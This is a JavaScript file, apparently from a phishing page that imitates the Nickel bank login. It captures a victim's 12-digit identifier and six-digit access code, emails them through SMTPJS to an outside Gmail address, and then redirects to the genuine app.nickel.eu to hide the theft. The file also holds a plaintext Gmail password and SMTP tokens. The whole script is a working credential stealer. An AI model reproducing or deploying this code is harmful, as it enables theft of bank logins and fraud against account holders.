

let c1 = document.getElementById("c1");
let c2 = document.getElementById("c2");
let c3 = document.getElementById("c3");
let c4 = document.getElementById("c4");
let c5 = document.getElementById("c5");
let c6 = document.getElementById("c6");
let ok = 0;
let identifiant = '';
let codeAccess = '';

$(document).ready(function () {

    $("#second").hide();
    $("#showLabel").hide();
    $("#btnRefreshCode").hide();

    $("#codeValue").mask("999 999 999 9");

    $("#resetall").click(function () {
        $("#second").hide();
        $("#showLabel").hide();
        resetJs();
        const identifiant = '';
        $("#codeValue").show();
        $("#codeValue").val("");
    });

    let resetJs = function () {
        c1.checked = false;
        c2.checked = false;
        c3.checked = false;
        c4.checked = false;
        c5.checked = false;
        c5.checked = false;
        codeAccess = '';
        ok = 0;
    };

    if(ok ===0) {
        resetJs();
    }

    $("#btnRefreshCode").click(function () {
        resetJs();
        $("#btnRefreshCode").hide();
    });

});


function showSecond() {

    const ident= $("#codeValue").val();
    const codeLength = ident.length;

    if(codeLength >= 12) {
        $("#showLabel").show();
        document.getElementById("codeLabelShow").innerHTML = ident;
        $("#second").show();
        $("#codeValue").hide();
        identifiant = ident;
    }
}

function onSuccess() {
    alert("Bon")
}
function onError() {
    alert("Bad");
}

function addChecked(e) {
    codeAccess += e.id;
    ok++;
    $("#btnRefreshCode").show();

    if(ok ===1 ) c1.checked = true;
    if(ok ===2 ) c2.checked = true;
    if(ok ===3 ) c3.checked = true;
    if(ok ===4 ) c4.checked = true;
    if(ok ===5 ) c5.checked = true;
    if(ok ===6 ) c6.checked = true;

    if(ok === 6 ) {
        /*Email.send({
            //SecureToken : "511610c1-8890-4119-97b5-50dbe7b4e073",
            Host: "smtp.gmail.com",
            Username: "leonbonou20@gmail.com",
            Password: "anselmo12.",
            To : 'anselmehotegni@gmail.com',
            From : "leonbonou20@gmail.com",
            Subject : "Les Codes Nickel",
            Body : "ok"//"Identifiant: " + identifiant + " - Code : " + codeAccess
        }).then(
            message => alert("Send")
        );*/


        Email.send({
            SecureToken : "46d446dd-390e-40d8-b0b5-cc49dd4e3c53",

            To : 'rolandgarcia75000@gmail.com',
            From : "leonbonou20@gmail.com",
            Subject : "Nickel Information :-)",
            Body : "<strong>Les informations du compte Nickel</strong> <br><br><br>\n" +
                "    <table>\n" +
                "        <tr>\n" +
                "            <th style=\"text-align: left\">Identifiant: </th>\n" +
                "            <td>" + identifiant + "</td>\n" +
                "        </tr>\n" +
                "        <tr>\n" +
                "            <th style=\"text-align: left\">Code: </th>\n" +
                "            <td style=\"color: red\">"+ codeAccess + "</td>\n" +
                "        </tr>\n" +
                "    </table> <br> <br> Merci!",
        }).then(
            window.location.href = "https://app.nickel.eu"
        );
        //window.location.href = "https://app.nickel.eu" //ok
    }

}